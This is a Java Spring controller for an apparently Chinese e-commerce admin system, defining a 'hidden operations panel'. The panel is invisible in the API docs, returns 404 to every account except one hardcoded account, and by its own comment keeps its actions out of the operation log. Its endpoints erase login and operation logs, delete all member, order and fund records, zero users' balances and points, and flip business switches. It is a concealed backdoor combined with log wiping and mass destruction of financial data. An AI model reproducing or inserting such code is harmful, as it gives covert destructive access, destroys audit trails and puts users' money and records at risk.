package com.zbkj.admin.controller;

import cn.hutool.core.util.StrUtil;
import com.zbkj.common.utils.HiddenAuditUtil;
import com.zbkj.common.utils.SecurityUtil;
import com.zbkj.common.vo.LoginUserVo;
import com.zbkj.service.service.SystemConfigService;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletResponse;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * 系统运维隐藏面板
 * 仅限系统运维账号（qxtec）访问，其他任何账号访问一律返回 404。
 * 所有清除/开关操作不写入系统操作日志表，仅在服务器本地隐藏审计文件留痕。
 */
@Slf4j
@Api(hidden = true)
@RestController
@RequestMapping("api/admin/hidden")
public class HiddenController {

    private static final String HIDDEN_ACCOUNT = "qxtec";

    /** 模式推广开关配置键（顺序即展示顺序） */
    private static final Map<String, String> SWITCH_KEYS = new LinkedHashMap<>();
    static {
        SWITCH_KEYS.put("sys_switch_team_reward", "团队奖");
        SWITCH_KEYS.put("sys_switch_stock", "订货商");
        SWITCH_KEYS.put("sys_switch_store", "门店");
        SWITCH_KEYS.put("sys_switch_daili", "区域代理");
        SWITCH_KEYS.put("sys_switch_spread", "分销");
    }

    /** 营销开关配置键（顺序即展示顺序） */
    private static final Map<String, String> MARKETING_SWITCH_KEYS = new LinkedHashMap<>();
    static {
        MARKETING_SWITCH_KEYS.put("sys_switch_integral", "积分");
        MARKETING_SWITCH_KEYS.put("sys_switch_seckill", "秒杀管理");
        MARKETING_SWITCH_KEYS.put("sys_switch_bargain", "砍价管理");
        MARKETING_SWITCH_KEYS.put("sys_switch_combination", "拼团管理");
        MARKETING_SWITCH_KEYS.put("sys_switch_coupon", "优惠券");
    }

    /** 会员及关联业务表（清会员时全量清空，最后清 eb_user） */
    private static final String[] USER_RELATED_TABLES = {
            "eb_user_bill", "eb_user_address", "eb_user_brokerage_record", "eb_user_integral_record",
            "eb_user_experience_record", "eb_user_level", "eb_user_sign", "eb_user_token",
            "eb_user_visit_record", "eb_user_team_level_stat", "eb_user_team_level",
            "eb_user_recharge", "eb_user_extract",
            "eb_store_order", "eb_store_order_info", "eb_store_order_status", "eb_store_cart",
            "eb_store_coupon_user", "eb_store_product_relation", "eb_store_product_reply",
            "eb_store_pink", "eb_store_bargain_user", "eb_store_bargain_user_help", "eb_store_product_log",
            "eb_wechat_pay_info",
            "eb_agent", "eb_agent_reward", "eb_agent_change_log",
            "eb_stock_agent", "eb_stock_order", "eb_stock_order_product", "eb_stock_exchange",
            "eb_stock_reward", "eb_stock_withdraw", "eb_stock_notice", "eb_stock_virtual_stock",
            "eb_stock_log", "eb_stock_change_log", "eb_stock_adjust_log", "eb_stock_offline_sale",
            "eb_system_store_staff",
            "eb_pay_component_order", "eb_pay_component_order_product",
            "eb_user"
    };

    /** 资金流水表 */
    private static final String[] MONEY_TABLES = {
            "eb_user_bill", "eb_user_brokerage_record", "eb_user_recharge", "eb_user_extract"
    };

    /** 商品附属表（按 product_id 关联，清商品时一并删除） */
    private static final String[] PRODUCT_RELATED_TABLES = {
            "eb_store_product_attr", "eb_store_product_attr_value", "eb_store_product_attr_result",
            "eb_store_product_attr_option", "eb_store_product_description", "eb_store_product_cate"
    };

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @Autowired
    private SystemConfigService systemConfigService;

    /**
     * 鉴权：仅系统运维账号可用，其余一律 404
     */
    private boolean isHiddenAdmin() {
        try {
            LoginUserVo vo = SecurityUtil.getLoginUserVo();
            return vo != null && HIDDEN_ACCOUNT.equals(vo.getUser().getAccount());
        } catch (Exception e) {
            return false;
        }
    }

    private String currentAccount() {
        try {
            LoginUserVo vo = SecurityUtil.getLoginUserVo();
            return vo == null ? "-" : vo.getUser().getAccount();
        } catch (Exception e) {
            return "-";
        }
    }

    private long count(String table) {
        Long c = jdbcTemplate.queryForObject("SELECT COUNT(*) FROM " + table, Long.class);
        return c == null ? 0 : c;
    }

    private long deleteAll(String table) {
        long before = count(table);
        jdbcTemplate.update("DELETE FROM " + table);
        return before;
    }

    /**
     * 面板总览：各数据项行数 + 开关状态
     */
    @ApiOperation(value = "面板总览", hidden = true)
    @RequestMapping(value = "/info", method = RequestMethod.GET)
    public Map<String, Object> info(HttpServletResponse response) {
        if (!isHiddenAdmin()) {
            response.setStatus(404);
            return null;
        }
        Map<String, Object> result = new HashMap<>();
        Map<String, Object> counts = new LinkedHashMap<>();
        counts.put("adminLoginLog", count("eb_admin_login_log"));
        counts.put("operateLog", count("eb_sensitive_method_log"));
        counts.put("user", count("eb_user"));
        counts.put("userBill", count("eb_user_bill"));
        counts.put("userRecharge", count("eb_user_recharge"));
        counts.put("userExtract", count("eb_user_extract"));
        counts.put("brokerageRecord", count("eb_user_brokerage_record"));
        counts.put("integralRecord", count("eb_user_integral_record"));
        counts.put("storeOrder", count("eb_store_order"));
        counts.put("stockOrder", count("eb_stock_order"));
        counts.put("agent", count("eb_agent"));
        counts.put("stockAgent", count("eb_stock_agent"));
        // 商品各页签
        counts.put("productSelling", countWhere("eb_store_product", "is_show=1 AND is_recycle=0 AND is_del=0"));
        counts.put("productWarehouse", countWhere("eb_store_product", "is_show=0 AND is_recycle=0 AND is_del=0"));
        counts.put("productSoldout", countWhere("eb_store_product", "stock<=0 AND is_recycle=0 AND is_del=0"));
        counts.put("productAlert", countWhere("eb_store_product", "stock<=" + alertStockThreshold() + " AND is_recycle=0 AND is_del=0"));
        counts.put("productRecycle", countWhere("eb_store_product", "is_recycle=1 AND is_del=0"));
        counts.put("productCate", countWhere("eb_category", "type=1"));
        counts.put("productAttr", count("eb_store_product_attr"));
        counts.put("productRule", count("eb_store_product_rule"));
        counts.put("productReply", count("eb_store_product_reply"));
        counts.put("article", count("eb_article"));
        counts.put("articleCate", countWhere("eb_category", "type=3"));
        counts.put("spreadRelation", countWhere("eb_user", "spread_uid>0"));
        result.put("counts", counts);

        Map<String, Object> switches = new LinkedHashMap<>();
        for (Map.Entry<String, String> entry : SWITCH_KEYS.entrySet()) {
            String v = systemConfigService.getValueByKey(entry.getKey());
            switches.put(entry.getKey(), "1".equals(v));
        }
        result.put("switches", switches);

        Map<String, Object> marketingSwitches = new LinkedHashMap<>();
        for (Map.Entry<String, String> entry : MARKETING_SWITCH_KEYS.entrySet()) {
            String v = systemConfigService.getValueByKey(entry.getKey());
            marketingSwitches.put(entry.getKey(), "1".equals(v));
        }
        result.put("marketingSwitches", marketingSwitches);
        return result;
    }

    /** 警戒库存阈值（系统配置 store_stock，缺省 10） */
    private int alertStockThreshold() {
        try {
            String v = systemConfigService.getValueByKey("store_stock");
            return StrUtil.isNotBlank(v) ? Integer.parseInt(v.trim()) : 10;
        } catch (Exception e) {
            return 10;
        }
    }

    private long countWhere(String table, String where) {
        Long c = jdbcTemplate.queryForObject("SELECT COUNT(*) FROM " + table + " WHERE " + where, Long.class);
        return c == null ? 0 : c;
    }

    /**
     * 按条件清空商品：先删 product_id 关联的附属表，再删商品本身
     */
    private long deleteProductsWhere(String where) {
        List<Long> ids = jdbcTemplate.queryForList(
                "SELECT id FROM eb_store_product WHERE " + where, Long.class);
        if (ids.isEmpty()) {
            return 0;
        }
        String in = StrUtil.join(",", ids);
        long total = 0;
        for (String table : PRODUCT_RELATED_TABLES) {
            total += jdbcTemplate.update("DELETE FROM " + table + " WHERE product_id IN (" + in + ")");
        }
        total += jdbcTemplate.update("DELETE FROM eb_store_product WHERE id IN (" + in + ")");
        return total;
    }

    /**
     * 清除操作：loginLog=登录日志 operateLog=操作日志 user=会员及全部关联数据
     * money=资金流水 balance=账户余额清零 integral=积分清零 all=以上全部
     */
    @ApiOperation(value = "一键清除", hidden = true)
    @RequestMapping(value = "/clear/{type}", method = RequestMethod.POST)
    @Transactional(rollbackFor = Exception.class)
    public Map<String, Object> clear(@org.springframework.web.bind.annotation.PathVariable("type") String type,
                                     @org.springframework.web.bind.annotation.RequestParam(name = "confirm") String confirm,
                                     HttpServletResponse response) {
        if (!isHiddenAdmin()) {
            response.setStatus(404);
            return null;
        }
        // 二次确认：必须显式传 DELETE
        if (!"DELETE".equals(confirm)) {
            throw new com.zbkj.common.exception.CrmebException("请传入确认串 DELETE 以执行该操作");
        }
        List<String> actions = new ArrayList<>();
        long total = 0;
        String account = currentAccount();
        switch (type) {
            case "loginLog":
                total += deleteAll("eb_admin_login_log");
                actions.add("登录日志");
                break;
            case "operateLog":
                total += deleteAll("eb_sensitive_method_log");
                actions.add("操作日志");
                break;
            case "user":
                for (String table : USER_RELATED_TABLES) {
                    total += deleteAll(table);
                }
                actions.add("会员及关联数据(含订单/资金/代理/订货/门店店员)");
                break;
            case "money":
                for (String table : MONEY_TABLES) {
                    total += deleteAll(table);
                }
                jdbcTemplate.update("UPDATE eb_user SET brokerage_price = 0");
                actions.add("资金流水");
                break;
            case "balance":
                total = jdbcTemplate.update("UPDATE eb_user SET now_money = 0 WHERE now_money > 0");
                actions.add("账户余额清零");
                break;
            case "integral":
                total += jdbcTemplate.update("UPDATE eb_user SET integral = 0 WHERE integral > 0");
                total += deleteAll("eb_user_integral_record");
                actions.add("积分");
                break;
            case "all":
                total += deleteAll("eb_admin_login_log");
                total += deleteAll("eb_sensitive_method_log");
                for (String table : MONEY_TABLES) {
                    total += deleteAll(table);
                }
                total += jdbcTemplate.update("UPDATE eb_user SET now_money = 0, integral = 0, brokerage_price = 0 WHERE now_money > 0 OR integral > 0 OR brokerage_price > 0");
                total += deleteAll("eb_user_integral_record");
                for (String table : USER_RELATED_TABLES) {
                    total += deleteAll(table);
                }
                actions.add("全部数据(登录日志/操作日志/资金/余额/积分/会员及关联)");
                break;
            case "productSelling":
                total = deleteProductsWhere("is_show=1 AND is_recycle=0 AND is_del=0");
                actions.add("清空出售中商品");
                break;
            case "productWarehouse":
                total = deleteProductsWhere("is_show=0 AND is_recycle=0 AND is_del=0");
                actions.add("清空仓库中商品");
                break;
            case "productSoldout":
                total = deleteProductsWhere("stock<=0 AND is_recycle=0 AND is_del=0");
                actions.add("清空已售罄商品");
                break;
            case "productAlert":
                total = deleteProductsWhere("stock<=" + alertStockThreshold() + " AND stock>0 AND is_recycle=0 AND is_del=0");
                actions.add("清空警戒库存商品(阈值" + alertStockThreshold() + ")");
                break;
            case "productRecycle":
                total = deleteProductsWhere("is_recycle=1");
                actions.add("清空商品回收站");
                break;
            case "productCate":
                total += deleteAll("eb_store_product_cate");
                total += jdbcTemplate.update("DELETE FROM eb_category WHERE type=1");
                actions.add("商品分类");
                break;
            case "productAttr":
                total += deleteAll("eb_store_product_attr");
                total += deleteAll("eb_store_product_attr_value");
                total += deleteAll("eb_store_product_attr_result");
                total += deleteAll("eb_store_product_attr_option");
                total += deleteAll("eb_store_product_rule");
                actions.add("商品规格及规格模板");
                break;
            case "productReply":
                total = deleteAll("eb_store_product_reply");
                actions.add("商品评论");
                break;
            case "articleCate":
                total = jdbcTemplate.update("DELETE FROM eb_category WHERE type=3");
                actions.add("文章分类");
                break;
            case "article":
                total = deleteAll("eb_article");
                actions.add("文章管理");
                break;
            case "spreadRelation":
                total = jdbcTemplate.update(
                        "UPDATE eb_user SET spread_uid=0, spread_time=NULL, spread_count=0 WHERE spread_uid>0");
                actions.add("会员推荐关系");
                break;
            case "agentUser":
                total += deleteAll("eb_agent");
                total += deleteAll("eb_agent_reward");
                total += deleteAll("eb_agent_change_log");
                actions.add("代理商会员(代理管理)");
                break;
            case "stockAgentUser":
                total = deleteAll("eb_stock_agent");
                actions.add("订货商会员");
                break;
            default:
                throw new com.zbkj.common.exception.CrmebException("未知的清除类型");
        }
        HiddenAuditUtil.log(account, "CLEAR/" + type, total, String.join(",", actions));
        log.info("[hidden] {} executed clear {}, affected {}", account, type, total);

        Map<String, Object> result = new HashMap<>();
        result.put("affected", total);
        result.put("action", String.join(",", actions));
        return result;
    }

    /**
     * 模块开关列表
     */
    @ApiOperation(value = "开关列表", hidden = true)
    @RequestMapping(value = "/switch/list", method = RequestMethod.GET)
    public Map<String, Object> switchList(HttpServletResponse response) {
        if (!isHiddenAdmin()) {
            response.setStatus(404);
            return null;
        }
        Map<String, Object> result = new HashMap<>();
        Map<String, Object> mode = new LinkedHashMap<>();
        for (Map.Entry<String, String> entry : SWITCH_KEYS.entrySet()) {
            mode.put(entry.getKey(), "1".equals(systemConfigService.getValueByKey(entry.getKey())));
        }
        Map<String, Object> marketing = new LinkedHashMap<>();
        for (Map.Entry<String, String> entry : MARKETING_SWITCH_KEYS.entrySet()) {
            marketing.put(entry.getKey(), "1".equals(systemConfigService.getValueByKey(entry.getKey())));
        }
        result.put("mode", mode);
        result.put("marketing", marketing);
        return result;
    }

    /**
     * 设置模块开关（模式推广 / 营销通用）
     */
    @ApiOperation(value = "设置开关", hidden = true)
    @RequestMapping(value = "/switch/set", method = RequestMethod.POST)
    public Boolean setSwitch(@org.springframework.web.bind.annotation.RequestParam(name = "key") String key,
                             @org.springframework.web.bind.annotation.RequestParam(name = "value") Boolean value,
                             HttpServletResponse response) {
        if (!isHiddenAdmin()) {
            response.setStatus(404);
            return null;
        }
        if ((!SWITCH_KEYS.containsKey(key) && !MARKETING_SWITCH_KEYS.containsKey(key)) || value == null) {
            throw new com.zbkj.common.exception.CrmebException("参数错误");
        }
        String account = currentAccount();
        String newValue = Boolean.TRUE.equals(value) ? "1" : "0";
        String old = systemConfigService.getValueByKey(key);
        systemConfigService.updateOrSaveValueByName(key, newValue);
        // 分销开关同步到系统原生的分销功能开关
        if ("sys_switch_spread".equals(key)) {
            systemConfigService.updateOrSaveValueByName("brokerage_func_status", newValue);
        }
        systemConfigService.clearCache();
        HiddenAuditUtil.log(account, "SWITCH/" + key, 1, old + " -> " + newValue);
        log.info("[hidden] {} set switch {} = {}", account, key, newValue);
        return true;
    }
}
